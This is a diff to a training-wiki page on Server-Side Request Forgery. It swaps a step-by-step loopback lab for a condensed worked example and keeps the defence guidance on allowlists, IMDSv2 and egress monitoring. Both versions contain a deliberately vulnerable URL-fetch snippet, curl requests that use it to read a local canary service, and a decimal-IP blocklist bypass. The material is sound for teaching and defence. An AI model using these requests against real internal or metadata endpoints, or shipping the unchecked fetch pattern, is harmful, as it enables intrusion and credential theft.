@@ -1,7 +1,7 @@
 ---
 title: "Server-Side Request Forgery"
 aliases: ["SSRF", "Server Side Request Forgery"]
-tags: [tree/offensive, cyber/offensive/web/http/ssrf, type/technique, level/operator]
+tags: [tree/offensive, cyber/offensive/web/http/ssrf, type/technique, difficulty/medium]
 Domain: "[[HTTP Architecture & Advanced Web Attacks]]"
 Color: "#DC143C"
 ---
@@ -14,7 +14,7 @@ Color: "#DC143C"
 ## Parent Learning Order
 Server-Side Request Forgery -> HTTP Request Smuggling -> Web Cache Attacks -> WAF Testing & Bypass Methodology
 
-## Start at Zero: Making the Server Fetch on Your Behalf
+## Making the Server Fetch on Your Behalf
 
 **Server-Side Request Forgery (SSRF)** is a flaw where an attacker induces the *server* to make a request to a URL the attacker chooses. The power is *position*: the server sits inside the network, so it can reach internal services, cloud metadata endpoints, and admin interfaces that the attacker — stuck outside the firewall — cannot touch directly. SSRF turns a public web application into a proxy into the internal infrastructure.
 
@@ -67,7 +67,63 @@ flowchart TD
     I --> P
 ```
 
-## Failure Modes and Interpretation
+## Worked Example: Reading an Internal Service Through a Public One
+
+Server-side request forgery turns a server's own reachability into the attacker's.
+The vulnerable feature is ordinary — an app that fetches a user-supplied URL — and
+the exploit is simply pointing it inward.
+
+**The specimen** fetches whatever URL it is handed, with no allowlist:
+
+```python
+url = request.args.get("url")
+data = urllib.request.urlopen(url, timeout=2).read()   # VULNERABLE: any URL
+return b"fetched: " + data
+```
+
+**Legitimate use** looks exactly as intended:
+
+```shell-session
+analyst@lab:~$ curl -s "http://127.0.0.1:8111/?url=http://example.com/" | head -c 40
+fetched: <!doctype html>
+```
+
+The feature works, which is why it ships. Nothing about the happy path hints at
+the problem — the app is doing precisely what it was built to do.
+
+**The exploit** aims the same feature at a service the attacker cannot reach
+directly:
+
+```shell-session
+analyst@lab:~$ curl -s "http://127.0.0.1:8111/?url=http://127.0.0.1:9001/"
+fetched: INTERNAL-CANARY: secret admin panel
+```
+
+The internal service on `9001` binds to localhost and is unreachable from
+outside. The attacker still read it — because the *server* reached it, and handed
+the response back. That is the whole of SSRF: the request originates from the
+server's network position, not the attacker's, so every trust the network places
+in "traffic from this server" is now available to whoever controls the URL. On a
+cloud host the highest-value target of this exact request is the instance
+metadata endpoint, which hands out credentials to anything that can ask.
+
+**Why blocklists fail**, in one line:
+
+```shell-session
+analyst@lab:~$ curl -s "http://127.0.0.1:8111/?url=http://2130706433:9001/" | head -c 30
+fetched: INTERNAL-CANARY: secre
+```
+
+`2130706433` is `127.0.0.1` written as a single decimal integer, and it reaches
+the same service. A filter that blocks the string `127.0.0.1` never sees it, and
+the equivalents are numerous: decimal, octal, hex, IPv6-mapped, a DNS name that
+resolves to a private address, a redirect from an allowed host to a blocked one.
+Enumerating bad forms is a losing game, which is why the robust fix is an
+*allowlist* of permitted destinations plus blocking the metadata IP outright —
+deciding what the feature may reach, rather than trying to name everything it may
+not.
+
+## Canary services instead of real metadata endpoints
 
 - **Proving against real internal targets.** Hitting real cloud metadata or an internal service could steal live credentials or cause side effects. Prove with a benign canary service you placed on loopback.
 - **Blind SSRF missed.** Concluding "no SSRF" because the response isn't reflected misses blind SSRF — test for out-of-band request confirmation before deciding safe.
@@ -83,98 +139,13 @@ flowchart TD
 - **Least-privilege the fetching service** and restrict its network egress so even a successful SSRF reaches little.
 - **Detection** looks for the server making unexpected outbound requests — especially to internal or metadata addresses — the same SSRF signature as XXE-via-SSRF. Egress monitoring on the application tier catches it.
 
-## Authorized Lab: SSRF Into a Benign Internal Service
+## Summary
 
-> [!info] Runs on one Linux machine — builds a fetch feature and a loopback-only "internal" service, then reaches it via SSRF
-> All loopback; the "internal" target is a benign canary you place. Step 5 removes it.
+You should now be able to:
 
-### Step 1 — Build an "internal-only" service and a public app that fetches URLs
-
-```bash
-# the "internal" service — imagine it's only reachable from inside the network
-python3 -c "
-import http.server
-class I(http.server.BaseHTTPRequestHandler):
-    def do_GET(s): s.send_response(200); s.end_headers(); s.wfile.write(b'INTERNAL-CANARY: secret admin panel')
-    def log_message(s,*a): pass
-http.server.HTTPServer(('127.0.0.1',9001),I).serve_forever()" &>/dev/null &
-# the public app with a vulnerable URL-fetch feature
-cat > /tmp/ssrf.py << 'EOF'
-import http.server, urllib.parse, urllib.request
-class H(http.server.BaseHTTPRequestHandler):
-    def do_GET(self):
-        url = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query).get("url",[""])[0]
-        try:  # VULNERABLE: fetches any user-supplied URL, no allowlist
-            data = urllib.request.urlopen(url, timeout=2).read()
-            self.send_response(200); self.end_headers(); self.wfile.write(b"fetched: "+data)
-        except Exception as e:
-            self.send_response(500); self.end_headers(); self.wfile.write(str(e).encode())
-    def log_message(self,*a): pass
-http.server.HTTPServer(("127.0.0.1",8111),H).serve_forever()
-EOF
-python3 /tmp/ssrf.py &>/dev/null &
-sleep 1; echo "public app :8111 (fetch feature), internal service :9001 (loopback-only)"
-```
-
-```text
-public app :8111 (fetch feature), internal service :9001 (loopback-only)
-```
-
-### Step 2 — Legitimate use (baseline)
-
-```bash
-curl -s "http://127.0.0.1:8111/?url=http://example.com/" | head -c 40
-```
-
-```text
-fetched: <!doctype html>
-```
-
-The feature fetches an external URL as intended.
-
-### Step 3 — SSRF to the internal-only service (the finding)
-
-```bash
-curl -s "http://127.0.0.1:8111/?url=http://127.0.0.1:9001/"
-```
-
-```text
-fetched: INTERNAL-CANARY: secret admin panel
-```
-
-The public app fetched the **internal-only** service and returned its content — SSRF confirmed. An external attacker who cannot reach `:9001` directly just read it *through* the server. Here the target is a benign canary; on a real system this same request would hit an internal admin panel or cloud metadata.
-
-### Step 4 — Demonstrate a filter bypass
-
-```bash
-# even if the app blocked "127.0.0.1", alternate forms reach the same target
-echo "decimal IP -> $(curl -s "http://127.0.0.1:8111/?url=http://2130706433:9001/" | head -c 30)"
-```
-
-```text
-decimal IP -> fetched: INTERNAL-CANARY: secre
-```
-
-`2130706433` is `127.0.0.1` in decimal — a form a naive `127.0.0.1` blocklist would miss. This is why allowlisting destinations (not blocklisting) is the only robust fix.
-
-### Step 5 — Cleanup
-
-```bash
-kill %1 %2 2>/dev/null; rm -f /tmp/ssrf.py; wait 2>/dev/null
-curl -s -o /dev/null -w "app gone: %{http_code}\n" --max-time 2 http://127.0.0.1:8111/ 2>&1 | grep -o 'gone.*' || echo "app gone: connection refused"
-```
-
-```text
-app gone: connection refused
-```
-
-**What you should now be able to do:** recognize URL-fetch features as SSRF candidates, reach an internal-only service through a vulnerable server with a benign canary, bypass a naive loopback blocklist with an alternate IP form, and explain why allowlisting destinations is the only robust fix.
-
-## Crook → Operator → Root Checkpoint
-
-- **Crook:** Explain why making the server fetch a URL is dangerous, and what internal targets SSRF can reach that an outside attacker cannot.
-- **Operator:** Prove SSRF into a benign internal service, distinguish full from blind SSRF, and bypass a loopback blocklist with an alternate IP form.
-- **Root:** Explain why the cloud-metadata target makes SSRF a credential-theft path, why allowlisting resolved IPs at fetch time (following redirects) is the robust fix, and how IMDSv2 and egress restriction contain it.
+- Explain why making the server fetch a URL is dangerous, and what internal targets SSRF can reach that an outside attacker cannot.
+- Prove SSRF into a benign internal service, distinguish full from blind SSRF, and bypass a loopback blocklist with an alternate IP form.
+- Explain why the cloud-metadata target makes SSRF a credential-theft path, why allowlisting resolved IPs at fetch time (following redirects) is the robust fix, and how IMDSv2 and egress restriction contain it.
 
 ---
 > 🔼 Up: [[HTTP Architecture & Advanced Web Attacks]]
